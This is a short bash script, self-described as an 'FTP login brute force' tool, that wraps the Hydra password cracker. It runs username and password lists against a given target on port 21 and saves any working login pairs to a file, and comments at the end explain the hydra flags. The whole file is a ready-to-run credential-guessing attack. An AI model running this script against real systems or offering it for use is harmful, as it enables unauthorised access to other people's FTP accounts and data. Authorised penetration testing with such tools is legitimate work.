#!/usr/bin/env bash
usage () {
    echo "[*] FTP login brute force"
    echo "[*] Usage : $0 <target> <user.lst> <pass.lst>"
    echo "[*] Ex1 : $0 10.0.0.1-254"
    echo "[*] Ex2 : $0 192.168.1.20"
    exit 1
}

if [ $# -eq 3 ]; then
    hydra -L $2 -P $3 -f -o ftp-hydra-$1.txt -u $1 -s 21 ftp
    exit 0
else
    usage
fi

    #    -o FILE
    #           write found login/password pairs to FILE instead of stdout
    #    -f     exit after the first found login/password pair (per host if -M)
    #    -l LOGIN
    #           or -L FILE login with LOGIN name, or load several logins from FILE
    #    -p PASS
    #           or -P FILE try password PASS, or load several passwords from FILE
    #    -u     by default Hydra checks all passwords for one login and then tries the next login. This option loops around the passwords, so the first pass‐    
    #           word is tried on all logins, then the next password.
    #    -s PORT
    #           if the service is on a different default port, define it here
